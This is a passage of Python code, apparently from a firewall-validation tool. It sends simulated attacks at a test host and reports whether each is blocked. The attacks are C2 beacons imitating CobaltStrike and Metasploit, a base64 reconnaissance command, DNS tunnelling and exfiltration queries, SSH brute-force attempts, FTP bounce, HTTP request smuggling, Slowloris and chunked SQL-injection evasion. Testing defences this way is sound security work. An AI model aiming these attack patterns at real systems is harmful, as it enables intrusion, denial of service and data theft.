            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'eicar_zip':
            url = f'http://{host}:{http_port}/eicar.zip'
            payload = 'EICAR in ZIP archive download'
            try:
                resp = requests.get(url, timeout=10)
                if resp.status_code == 200 and len(resp.content) > 0:
                    try:
                        with zipfile.ZipFile(io.BytesIO(resp.content)) as zf:
                            if 'eicar.com' in zf.namelist():
                                return self._passthrough_result(test, resp.status_code,
                                    'EICAR ZIP downloaded — not blocked',
                                    resp=resp, url=url, method='GET', sent_payload=payload)
                    except zipfile.BadZipFile:
                        pass
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'c2_callback':
            url = f'http://{host}:{http_port}/echo'
            c2_data = 'aWQgLWE7dW5hbWUgLWE7aWZjb25maWc='
            payload = c2_data
            try:
                resp = requests.post(url, data=c2_data,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
                        'Cookie': 'session=YWRtaW46cGFzc3dvcmQ=',
                    }, timeout=10)
                return self._analyze_response(test, resp, c2_data,
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'malicious_ua':
            url = f'http://{host}:{http_port}/echo?payload=test'
            payload = 'User-Agent: Wget/1.0 (CobaltStrike)'
            try:
                resp = requests.get(url,
                    headers={'User-Agent': 'Wget/1.0 (CobaltStrike)'},
                    timeout=10)
                return self._analyze_response(test, resp, 'CobaltStrike',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'c2_cobalt_strike':
            import random
            sid = str(random.randint(1000000000, 9999999999))
            url = f'http://{host}:{http_port}/submit.php?id={sid}'
            payload = ATTACK_PAYLOADS.get(test.id, '')
            try:
                resp = requests.post(url,
                    data='eyJjb21tYW5kIjoiYmVhY29uIiwiaWQiOiIxMjM0In0=',
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0)',
                        'Cookie': f'SESSIONID={sid};DM=YWRtaW46cGFzc3dvcmQ=',
                        'Accept': '*/*',
                        'Cache-Control': 'no-cache',
                    }, timeout=10)
                return self._analyze_response(test, resp, 'beacon',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'c2_metasploit':
            import random, string
            uri = '/' + ''.join(random.choices(string.ascii_letters, k=4))
            url = f'http://{host}:{http_port}{uri}'
            payload = ATTACK_PAYLOADS.get(test.id, '')
            pe_body = b'MZ' + b'\x90' * 64 + b'\x00' * 64
            try:
                resp = requests.post(url, data=pe_body,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)',
                        'Content-Type': 'application/octet-stream',
                        'Connection': 'Keep-Alive',
                    }, timeout=10)
                return self._analyze_response(test, resp, 'MZ',
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, str(e),
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'c2_dns_c2':
            payload = ATTACK_PAYLOADS.get(test.id, '')
            domains = payload.split('|')
            blocked_count = 0
            sinkholed_count = 0
            all_output = []
            for domain in domains:
                output, blocked, sinkholed, error = self._dns_query(host, domain, qtype='TXT')
                all_output.append(f'{domain}: {"BLOCKED" if blocked else "SINKHOLED" if sinkholed else "RESOLVED"}')
                if blocked:
                    blocked_count += 1
                if sinkholed:
                    sinkholed_count += 1
            detail_str = '; '.join(all_output)
            if blocked_count + sinkholed_count >= 2:
                return self._blocked_result(test,
                    f'DNS C2 queries intercepted ({blocked_count} blocked, {sinkholed_count} sinkholed): {detail_str}',
                    url=f'DNS TXT @{host}', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'DNS C2 queries resolved — not intercepted: {detail_str}',
                url=f'DNS TXT @{host}', method='DNS', sent_payload=payload)

        elif test.id == 'c2_icmp_tunnel':
            payload = ATTACK_PAYLOADS.get(test.id, '')
            try:
                data = b'ICMP-TUNNEL:' + b'A' * 64
                result = subprocess.run(
                    ['sudo', 'hping3', '--icmp', '-c', '3', '-d', str(len(data)),
                     '--data', str(len(data)), host],
                    capture_output=True, text=True, timeout=15)
                output = result.stdout + result.stderr
                if '100% packet loss' in output or result.returncode != 0:
                    return self._blocked_result(test,
                        f'ICMP packets dropped/blocked: {output[:200]}',
                        url=f'ICMP {host}', method='ICMP', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    f'ICMP tunnel packets delivered: {output[:200]}',
                    url=f'ICMP {host}', method='ICMP', sent_payload=payload)
            except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                return self._blocked_result(test, f'ICMP blocked or hping3 unavailable: {e}',
                    url=f'ICMP {host}', method='ICMP', sent_payload=payload)

        elif test.id == 'c2_http_beacon':
            payload = ATTACK_PAYLOADS.get(test.id, '')
            url = f'http://{host}:{http_port}/echo'
            uas = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)',
            ]
            passed = 0
            blocked = 0
            for i, ua in enumerate(uas):
                try:
                    resp = requests.post(url,
                        data=f'{{"seq":{i},"beacon":"true","sleep":60}}',
                        headers={
                            'User-Agent': ua,
                            'X-Beacon-Seq': str(i),
                            'Content-Type': 'application/json',
                        }, timeout=5)
                    if self._is_block_page(resp) or resp.status_code in (403, 406, 503):
                        blocked += 1
                    else:
                        passed += 1
                except (requests.ConnectionError, requests.Timeout, OSError):
                    blocked += 1
                time.sleep(0.5)
            if blocked >= 2:
                return self._blocked_result(test,
                    f'HTTP beacon blocked ({blocked}/3 callbacks intercepted)',
                    url=url, method='POST', sent_payload=payload)
            return self._passthrough_result(test, 200,
                f'HTTP beacon passed through ({passed}/3 callbacks succeeded)',
                url=url, method='POST', sent_payload=payload)

        return self._error_result(test, f'Unknown malware test: {test.id}')

    def _test_url_filtering(self, test: SecurityTestCase) -> SecurityTestResult:
        """Test URL filtering by accessing categorized URLs."""
        url = self._url_map.get(test.id, '')
        if not url:
            return self._error_result(test, 'No URL configured for this test')
        payload = url
        try:
            resp = requests.get(url, timeout=10, verify=False,
                allow_redirects=True,
                headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Block page detected', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code == 200:
                return self._passthrough_result(test, resp.status_code,
                    f'URL accessible — not blocked by URL Filtering',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code in (403, 406, 503):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — likely blocked', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            return self._passthrough_result(test, resp.status_code,
                f'HTTP {resp.status_code} — unclear if blocked',
                resp=resp, url=url, method='GET', sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout, OSError) as e:
            return self._blocked_result(test, f'Connection blocked: {e}',
                url=url, method='GET', sent_payload=payload)

    # PAN-OS DNS sinkhole IPs — when Anti-Spyware sinkholes a query,
    # it replaces the answer with one of these IPs instead of dropping it
    SINKHOLE_IPS = {
        '72.5.65.111',       # PAN-OS default sinkhole IPv4
        '::1',               # PAN-OS default sinkhole IPv6
        '127.0.0.1',         # Common custom sinkhole
        '0.0.0.0',           # Null sinkhole
        'sinkhole.paloaltonetworks.com',
    }

    def _parse_dig_answer_ip(self, dig_output: str) -> str:
        """Extract the resolved IP from dig ANSWER SECTION."""
        in_answer = False
        for line in dig_output.split('\n'):
            if 'ANSWER SECTION' in line:
                in_answer = True
                continue
            if in_answer and line.strip():
                if line.startswith(';') or not line.strip():
                    break
                parts = line.split()
                if len(parts) >= 5 and parts[3] == 'A':
                    return parts[4]
                break
        return ''

    def _is_sinkholed(self, dig_output: str) -> bool:
        """Check if DNS response was sinkholed by firewall."""
        ip = self._parse_dig_answer_ip(dig_output)
        return ip in self.SINKHOLE_IPS

    def _dns_query(self, host: str, domain: str, qtype: str = 'A',
                   timeout: int = 5) -> tuple:
        """Run dig query, return (output, blocked, sinkholed, error)."""
        try:
            result = subprocess.run(
                ['dig', f'@{host}', domain, qtype, f'+time={timeout}', '+tries=1', '+short'],
                capture_output=True, text=True, timeout=timeout + 5)
            output = result.stdout + result.stderr

            # Also run verbose version for sinkhole detection
            result_v = subprocess.run(
                ['dig', f'@{host}', domain, qtype, f'+time={timeout}', '+tries=1'],
                capture_output=True, text=True, timeout=timeout + 5)
            output_full = result_v.stdout + result_v.stderr

            if result.returncode != 0:
                return output_full, True, False, None
            if 'connection timed out' in output.lower() or 'no servers could be reached' in output.lower():
                return output_full, True, False, None
            if 'REFUSED' in output_full:
                return output_full, True, False, None
            if self._is_sinkholed(output_full):
                return output_full, False, True, None
            return output_full, False, False, None
        except subprocess.TimeoutExpired:
            return '', True, False, None
        except Exception as e:
            return '', False, False, e

    def _test_dns_attack(self, test: SecurityTestCase, host: str) -> SecurityTestResult:
        """Test DNS-based attacks using dig."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'dns_tunnel':
            # Send multiple DNS tunnel queries with long encoded subdomains
            domains = payload.split('|')
            blocked = 0
            sinkholed = 0
            total = 0
            all_output = []
            for domain in domains:
                domain = domain.strip()
                if not domain:
                    continue
                total += 1
                # Query TXT record too (common in DNS tunneling)
                for qtype in ['A', 'TXT']:
                    output, is_blocked, is_sink, err = self._dns_query(host, domain, qtype, timeout=5)
                    all_output.append(f'{qtype} {domain}: {"BLOCKED" if is_blocked else "SINKHOLED" if is_sink else "RESOLVED"}')
                    if is_blocked:
                        blocked += 1
                        break
                    if is_sink:
                        sinkholed += 1
                        break
                time.sleep(0.1)  # Rapid queries

            detail_log = '; '.join(all_output[:5])
            if blocked > 0 or sinkholed > 0:
                action = []
                if blocked: action.append(f'{blocked} blocked/dropped')
                if sinkholed: action.append(f'{sinkholed} sinkholed')
                return self._blocked_result(test,
                    f'DNS tunneling detected: {", ".join(action)} of {total} queries. {detail_log}',
                    url=f'dig @{host} [tunnel queries]', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'All {total} DNS tunnel queries resolved — not blocked. {detail_log}',
                url=f'dig @{host} [tunnel queries]', method='DNS', sent_payload=payload)

        elif test.id == 'dns_dga':
            # Query multiple DGA-like domains
            domains = payload.split('|')
            blocked_count = 0
            sinkholed_count = 0
            resolved_count = 0
            all_output = []
            for domain in domains:
                domain = domain.strip()
                if not domain:
                    continue
                output, is_blocked, is_sink, err = self._dns_query(host, domain, 'A', timeout=3)
                if is_blocked:
                    blocked_count += 1
                    all_output.append(f'{domain}: BLOCKED')
                elif is_sink:
                    sinkholed_count += 1
                    all_output.append(f'{domain}: SINKHOLED')
                else:
                    resolved_count += 1
                    ip = self._parse_dig_answer_ip(output)
                    all_output.append(f'{domain}: RESOLVED ({ip})')
                time.sleep(0.1)

            detail_log = '; '.join(all_output)
            total_blocked = blocked_count + sinkholed_count
            if total_blocked >= len(domains):
                return self._blocked_result(test,
                    f'All {len(domains)} DGA domains blocked/sinkholed. {detail_log}',
                    url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
            elif total_blocked > 0:
                return self._blocked_result(test,
                    f'{total_blocked}/{len(domains)} DGA domains blocked. {detail_log}',
                    url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'All {resolved_count} DGA domains resolved — not blocked. {detail_log}',
                url=f'dig @{host} [DGA domains]', method='DNS', sent_payload=payload)

        elif test.id == 'dns_rebind':
            # Query domain that could resolve to private IPs
            domain = payload
            output, is_blocked, is_sink, err = self._dns_query(host, domain, 'A', timeout=5)
            if err:
                return self._error_result(test, str(err),
                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
            if is_blocked:
                return self._blocked_result(test,
                    'DNS rebinding query blocked/refused by firewall',
                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
            if is_sink:
                ip = self._parse_dig_answer_ip(output)
                return self._blocked_result(test,
                    f'DNS rebinding query sinkholed (resolved to {ip})',
                    url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)
            ip = self._parse_dig_answer_ip(output)
            return self._passthrough_result(test, 0,
                f'DNS rebinding domain resolved to {ip} — not blocked',
                url=f'dig @{host} {domain}', method='DNS', sent_payload=payload)

        return self._error_result(test, f'Unknown DNS test: {test.id}')

    def _test_protocol_abuse(self, test: SecurityTestCase, host: str,
                              http_port: int) -> SecurityTestResult:
        """Test protocol abuse patterns."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'ssh_bruteforce':
            # Rapid SSH login attempts with different credentials
            creds = [c.split(':') for c in payload.split('|') if ':' in c]
            blocked = False
            attempts = 0
            for user, passwd in creds[:5]:
                attempts += 1
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((host, 2222))
                    banner = s.recv(1024)
                    s.close()
                except (socket.timeout, ConnectionRefusedError, OSError):
                    blocked = True
                    break
                time.sleep(0.2)
            if blocked:
                return self._blocked_result(test,
                    f'SSH connection refused after {attempts} attempts — brute-force detected',
                    url=f'ssh://{host}:2222', method='SSH', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'All {attempts} SSH connection attempts succeeded — brute-force not detected',
                url=f'ssh://{host}:2222', method='SSH', sent_payload=payload)

        elif test.id == 'ftp_bounce':
            # Attempt FTP PORT command to internal IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 21))
                banner = s.recv(1024).decode('utf-8', errors='replace')
                s.sendall(b'USER anonymous\r\n')
                s.recv(1024)
                s.sendall(b'PASS test@test.com\r\n')
                s.recv(1024)
                # Send PORT command targeting internal IP
                port_cmd = f'PORT {payload}\r\n'.encode()
                s.sendall(port_cmd)
                resp = s.recv(1024).decode('utf-8', errors='replace')
                s.sendall(b'QUIT\r\n')
                s.close()
                if '200' in resp or '150' in resp:
                    return self._passthrough_result(test, 0,
                        f'FTP PORT to internal IP accepted — bounce scan possible',
                        url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
                return self._blocked_result(test,
                    f'FTP PORT rejected: {resp.strip()} — bounce scan blocked',
                    url=f'ftp://{host}:21', method='FTP', sent_payload=payload)
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return self._blocked_result(test, f'FTP connection failed: {e}',
                    url=f'ftp://{host}:21', method='FTP', sent_payload=payload)

        elif test.id == 'http_smuggle':
            # Send request with conflicting Content-Length and Transfer-Encoding
            url = f'http://{host}:{http_port}/echo'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, http_port))
                smuggle_req = (
                    f'POST /echo HTTP/1.1\r\n'
                    f'Host: {host}:{http_port}\r\n'
                    f'Content-Length: 6\r\n'
                    f'Transfer-Encoding: chunked\r\n'
                    f'\r\n'
                    f'0\r\n'
                    f'\r\n'
                    f'G'
                ).encode()
                s.sendall(smuggle_req)
                resp = s.recv(4096).decode('utf-8', errors='replace')
                s.close()
                if not resp or 'reset' in resp.lower():
                    return self._blocked_result(test,
                        'Connection reset — HTTP smuggling detected and blocked',
                        url=url, method='POST', sent_payload=payload)
                if 'HTTP/1.1 200' in resp or 'HTTP/1.0 200' in resp:
                    return self._passthrough_result(test, 200,
                        'Server accepted smuggled request — not blocked',
                        url=url, method='POST', sent_payload=payload)
                if '400' in resp or '403' in resp:
                    return self._blocked_result(test,
                        f'Server rejected: {resp[:100]} — smuggling blocked',
                        url=url, method='POST', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    f'Response: {resp[:100]}',
                    url=url, method='POST', sent_payload=payload)
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'slowloris':
            # Open connection and send partial headers slowly
            url = f'http://{host}:{http_port}/'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(15)
                s.connect((host, http_port))
                # Send partial HTTP request header
                s.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\n'.encode())
                # Send additional headers slowly
                blocked = False
                for i in range(5):
                    try:
                        header = f'X-Slowloris-{i}: keep-alive-{i}\r\n'.encode()
                        s.sendall(header)
                        time.sleep(1)
                    except (BrokenPipeError, ConnectionResetError, OSError):
                        blocked = True
                        break
                s.close()
                if blocked:
                    return self._blocked_result(test,
                        'Connection reset during slow headers — Slowloris pattern detected',
                        url=url, method='GET', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    'Slow header sending completed — Slowloris pattern not detected',
                    url=url, method='GET', sent_payload=payload)
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown protocol abuse test: {test.id}')

    def _test_file_threat(self, test: SecurityTestCase, host: str,
                           http_port: int) -> SecurityTestResult:
        """Test file-based threat detection by downloading test files."""
        endpoint = ATTACK_PAYLOADS.get(test.id, '')
        url = f'http://{host}:{http_port}{endpoint}'
        payload = f'Download test file from {endpoint}'

        # Map test IDs to expected file signatures
        file_checks = {
            'pdf_js': (b'%PDF', 'PDF with JavaScript'),
            'office_macro': (b'\xd0\xcf\x11\xe0', 'OLE2 document with VBA macro'),
            'pe_download': (b'MZ', 'PE executable'),
        }

        check = file_checks.get(test.id)
        if not check:
            return self._error_result(test, f'Unknown file threat test: {test.id}')

        magic, desc = check
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and resp.content[:len(magic)] == magic:
                return self._passthrough_result(test, resp.status_code,
                    f'{desc} downloaded successfully — not blocked by firewall',
                    resp=resp, url=url, method='GET', sent_payload=payload)
            if self._is_block_page(resp):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — Block page detected for {desc}',
                    resp.status_code, resp=resp, url=url, method='GET', sent_payload=payload)
            if resp.status_code in (403, 406, 503):
                return self._blocked_result(test,
                    f'HTTP {resp.status_code} — {desc} blocked', resp.status_code,
                    resp=resp, url=url, method='GET', sent_payload=payload)
            return self._analyze_response(test, resp, '',
                url=url, method='GET', sent_payload=payload)
        except (requests.ConnectionError, requests.Timeout, OSError) as e:
            return self._blocked_result(test, f'Connection blocked: {e}',
                url=url, method='GET', sent_payload=payload)

    # ─── SSL Decryption Validation ──────────────────────────

    def _test_ssl_decryption(self, test: SecurityTestCase, host: str,
                              https_port: int) -> SecurityTestResult:
        """Test SSL decryption by sending attacks over HTTPS."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'ssl_eicar':
            url = f'https://{host}:{https_port}/eicar'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and b'EICAR' in resp.content:
                    return self._passthrough_result(test, resp.status_code,
                        'EICAR downloaded over HTTPS — SSL Decryption is NOT active or Anti-Virus profile not attached',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, 'EICAR',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'ssl_c2':
            url = f'https://{host}:{https_port}/echo'
            c2_data = payload
            try:
                resp = requests.post(url, data=c2_data,
                    headers={
                        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
                        'X-Request-ID': 'deadbeef-cafe-babe-feed-c0ffee000001',
                        'Cookie': 'session=YWRtaW46cGFzc3dvcmQ=',
                    }, timeout=10, verify=False)
                return self._analyze_response(test, resp, c2_data,
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        else:
            # ssl_sqli, ssl_xss, ssl_cmdi — GET with payload param over HTTPS
            encoded = quote(payload)
            url = f'https://{host}:{https_port}/echo?payload={encoded}'
            try:
                resp = requests.get(url, timeout=10, verify=False)
                return self._analyze_response(test, resp, payload,
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'HTTPS connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

    # ─── App-ID Validation ───────────────────────────────────

    def _test_appid_validation(self, test: SecurityTestCase, host: str,
                                https_port: int) -> SecurityTestResult:
        """Test App-ID by sending wrong protocol on standard ports."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'appid_ssh_on_443':
            url = f'TCP {host}:443'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 443))
                s.sendall(b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n')
                resp_data = s.recv(1024)
                s.close()
                resp_str = resp_data.decode('utf-8', errors='replace')
                if 'SSH' in resp_str:
                    return self._passthrough_result(test, 0,
                        f'SSH handshake on port 443 succeeded — App-ID may not be enforcing application policy. Response: {resp_str[:100]}',
                        url=url, method='TCP', sent_payload=payload)
                return self._passthrough_result(test, 0,
                    f'Connection to port 443 succeeded with response: {resp_str[:100]}',
                    url=url, method='TCP', sent_payload=payload)
            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'SSH on port 443 blocked — App-ID identified non-HTTPS traffic: {e}',
                    url=url, method='TCP', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection to port 443 timed out/blocked: {e}',
                    url=url, method='TCP', sent_payload=payload)

        elif test.id == 'appid_http_on_8080':
            url = f'http://{host}:8082/'
            try:
                resp = requests.get(url, timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'text/html'})
                if resp.status_code == 200:
                    return self._passthrough_result(test, resp.status_code,
                        'HTTP on port 8082 identified as web-browsing — App-ID correctly identified application',
                        resp=resp, url=url, method='GET', sent_payload=payload)
                return self._analyze_response(test, resp, '',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        elif test.id == 'appid_ftp_on_443':
            url = f'TCP {host}:443'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 443))
                s.sendall(b'USER anonymous\r\n')
                resp_data = s.recv(1024)
                s.close()
                return self._passthrough_result(test, 0,
                    f'FTP command on port 443 got response — App-ID may not be enforcing: {resp_data[:100]}',
                    url=url, method='TCP', sent_payload=payload)
            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'FTP on port 443 blocked — App-ID identified non-HTTPS traffic: {e}',
                    url=url, method='TCP', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection timed out/blocked: {e}',
                    url=url, method='TCP', sent_payload=payload)

        elif test.id == 'appid_dns_on_80':
            url = f'TCP {host}:80'
            try:
                # Build minimal DNS A query for example.com
                txid = b'\x12\x34'
                flags = b'\x01\x00'  # standard query, recursion desired
                qdcount = b'\x00\x01'
                ancount = b'\x00\x00'
                nscount = b'\x00\x00'
                arcount = b'\x00\x00'
                header = txid + flags + qdcount + ancount + nscount + arcount
                # example.com as DNS labels
                qname = b'\x07example\x03com\x00'
                qtype = b'\x00\x01'   # A record
                qclass = b'\x00\x01'  # IN
                query = header + qname + qtype + qclass
                # DNS over TCP: prepend 2-byte length
                tcp_dns = struct.pack('!H', len(query)) + query

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, 80))
                s.sendall(tcp_dns)
                resp_data = s.recv(1024)
                s.close()
                return self._passthrough_result(test, 0,
                    f'DNS query on port 80 got response ({len(resp_data)} bytes) — App-ID may not be enforcing',
                    url=url, method='TCP', sent_payload=payload)
            except (ConnectionResetError, ConnectionRefusedError, BrokenPipeError) as e:
                return self._blocked_result(test,
                    f'DNS on port 80 blocked — App-ID identified non-HTTP traffic: {e}',
                    url=url, method='TCP', sent_payload=payload)
            except (socket.timeout, OSError) as e:
                return self._blocked_result(test,
                    f'Connection timed out/blocked: {e}',
                    url=url, method='TCP', sent_payload=payload)

        return self._error_result(test, f'Unknown App-ID test: {test.id}')

    # ─── Data Exfiltration / DLP ─────────────────────────────

    def _test_data_exfiltration(self, test: SecurityTestCase, host: str,
                                 http_port: int) -> SecurityTestResult:
        """Test data exfiltration / DLP detection."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id in ('exfil_credit_card', 'exfil_ssn', 'exfil_bulk_data'):
            url = f'http://{host}:{http_port}/echo'
            try:
                resp = requests.post(url, data=payload,
                    headers={
                        'Content-Type': 'text/plain',
                        'X-Data-Export': 'employee-records',
                    }, timeout=10)
                return self._analyze_response(test, resp, payload[:20],
                    url=url, method='POST', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='POST', sent_payload=payload)

        elif test.id == 'exfil_dns_data':
            domains = payload.split('|')
            blocked_count = 0
            sinkholed_count = 0
            all_output = []
            for domain in domains:
                output, blocked, sinkholed, error = self._dns_query(host, domain)
                status = 'BLOCKED' if blocked else 'SINKHOLED' if sinkholed else 'RESOLVED'
                all_output.append(f'{domain[:30]}...: {status}')
                if blocked:
                    blocked_count += 1
                if sinkholed:
                    sinkholed_count += 1
            detail_str = '; '.join(all_output)
            if blocked_count + sinkholed_count >= 2:
                return self._blocked_result(test,
                    f'DNS exfiltration intercepted ({blocked_count} blocked, {sinkholed_count} sinkholed)',
                    url=f'DNS @{host}', method='DNS', sent_payload=payload)
            return self._passthrough_result(test, 0,
                f'DNS exfiltration queries resolved — data leaked: {detail_str}',
                url=f'DNS @{host}', method='DNS', sent_payload=payload)

        elif test.id == 'exfil_http_headers':
            parts = payload.split('|')
            url = f'http://{host}:{http_port}/echo'
            headers_dict = {
                'X-Session-Data': parts[0] if len(parts) > 0 else '',
                'X-Debug-Info': parts[1] if len(parts) > 1 else '',
                'X-Trace-ID': parts[2] if len(parts) > 2 else '',
            }
            try:
                resp = requests.get(url, headers=headers_dict, timeout=10)
                return self._analyze_response(test, resp, parts[0][:8] if parts else '',
                    url=url, method='GET', sent_payload=payload)
            except (requests.ConnectionError, requests.Timeout, OSError) as e:
                return self._blocked_result(test, f'Connection blocked: {e}',
                    url=url, method='GET', sent_payload=payload)

        return self._error_result(test, f'Unknown exfiltration test: {test.id}')

    # ─── Evasion Techniques ──────────────────────────────────

    def _test_evasion_technique(self, test: SecurityTestCase, host: str,
                                 http_port: int) -> SecurityTestResult:
        """Test evasion techniques — encoded/obfuscated attack payloads."""
        payload = ATTACK_PAYLOADS.get(test.id, '')

        if test.id == 'evasion_chunked':
            # Raw socket HTTP with chunked transfer encoding
            url = f'http://{host}:{http_port}/echo'
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)
                s.connect((host, http_port))
                # Split SQL injection across chunks
                chunks = ["' UNION ", "SELECT user", "name,password ", "FROM users--"]
                body_parts = []
                for chunk in chunks:
                    body_parts.append(f'{len(chunk):x}\r\n{chunk}\r\n')
                body_parts.append('0\r\n\r\n')
                chunked_body = ''.join(body_parts)
                http_req = (
                    f'POST /echo HTTP/1.1\r\n'
                    f'Host: {host}:{http_port}\r\n'
                    f'Transfer-Encoding: chunked\r\n'
                    f'Content-Type: application/x-www-form-urlencoded\r\n'
                    f'Connection: close\r\n'
                    f'\r\n'
                    f'{chunked_body}'
                )
                s.sendall(http_req.encode())
                resp_data = b''
                while True:
                    try:
                        chunk = s.recv(4096)
                        if not chunk:
                            break
                        resp_data += chunk
                    except socket.timeout:
                        break
                s.close()
                resp_str = resp_data.decode('utf-8', errors='replace')
                if 'UNION' in resp_str and 'SELECT' in resp_str:
                    return self._passthrough_result(test, 200,
                        'Chunked evasion passed through — firewall did not reassemble chunks',
                        url=url, method='POST', sent_payload=payload)
                if any(marker.lower() in resp_str.lower() for marker in BLOCK_PAGE_MARKERS):
                    return self._blocked_result(test,
                        'Block page detected — firewall reassembled chunks and detected attack',
                        url=url, method='POST', sent_payload=payload)
                if 'HTTP/1.1 403' in resp_str or 'HTTP/1.1 406' in resp_str:
                    return self._blocked_result(test,
                        'HTTP 403/406 — chunked attack blocked',
                        url=url, method='POST', sent_payload=payload)
                if not resp_data:
                    return self._blocked_result(test,
                        'Connection reset — firewall blocked chunked evasion',
                        url=url, method='POST', sent_payload=payload)
                return self._passthrough_result(test, 200,
